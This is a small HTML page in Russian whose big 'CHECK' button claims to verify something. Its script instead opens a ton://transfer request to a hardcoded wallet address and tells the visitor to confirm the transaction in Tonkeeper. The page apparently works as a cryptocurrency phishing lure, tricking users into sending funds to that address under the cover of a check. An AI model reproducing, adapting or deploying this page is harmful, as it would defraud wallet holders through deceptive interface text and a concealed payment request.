<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>TON</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #0b0b0b;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      font-family: system-ui, sans-serif;
      padding: 16px;
    }
    .card {
      max-width: 400px;
      width: 100%;
      background: #151515;
      border-radius: 32px;
      padding: 32px 24px;
      text-align: center;
      border: 1px solid #282828;
    }
    .btn {
      background: #0088cc;
      border: none;
      color: white;
      font-size: 20px;
      font-weight: 700;
      padding: 18px;
      border-radius: 60px;
      width: 100%;
      cursor: pointer;
      margin-top: 12px;
      transition: 0.2s;
    }
    .btn:active { transform: scale(0.96); }
    .btn:disabled { opacity: 0.4; pointer-events: none; }
    .btn-success { background: #00aa66; }
    #status {
      color: #aaa;
      font-size: 14px;
      margin-top: 20px;
      min-height: 24px;
    }
    .confirm-box {
      background: #1a2a3a;
      border: 1px solid #2a4a6a;
      border-radius: 20px;
      padding: 20px 16px;
      margin-top: 20px;
      display: none;
    }
    .confirm-box.show { display: block; }
    .confirm-box .title { color: #fff; font-weight: 600; font-size: 16px; }
    .confirm-box .sub { color: #8899aa; font-size: 13px; margin: 6px 0 14px; }
  </style>
</head>
<body>
  <div class="card">
    <div style="font-size: 40px;">⚡</div>

    <button class="btn" id="mainBtn">🚀 ПРОВЕРИТЬ</button>

    <div id="status">Нажмите кнопку</div>

    <div class="confirm-box" id="confirmBox">
      <div class="title">✅ Подтвердите транзакцию в Tonkeeper</div>
      <div class="sub">Откроется окно с ползунком</div>
    </div>
  </div>

  <script>
    const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';

    const mainBtn = document.getElementById('mainBtn');
    const status = document.getElementById('status');
    const confirmBox = document.getElementById('confirmBox');

    // ====== ОТКРЫТЬ TONKEEPER С ТРАНЗАКЦИЕЙ ======
    function openTransaction() {
      // ====== ПРЯМАЯ ССЫЛКА НА ПЕРЕВОД ======
      const url = `ton://transfer?address=${TARGET}`;

      status.innerText = '⏳ Открываю Tonkeeper...';
      confirmBox.classList.add('show');

      // Открываем
      window.location.href = url;

      setTimeout(() => {
        window.open(url, '_blank');
      }, 300);

      status.innerText = '✅ Подтвердите транзакцию в Tonkeeper';
    }

    // ====== КНОПКА ======
    mainBtn.onclick = function() {
      openTransaction();
    };

    status.innerText = 'Нажмите «ПРОВЕРИТЬ»';
  </script>
</body>
</html>
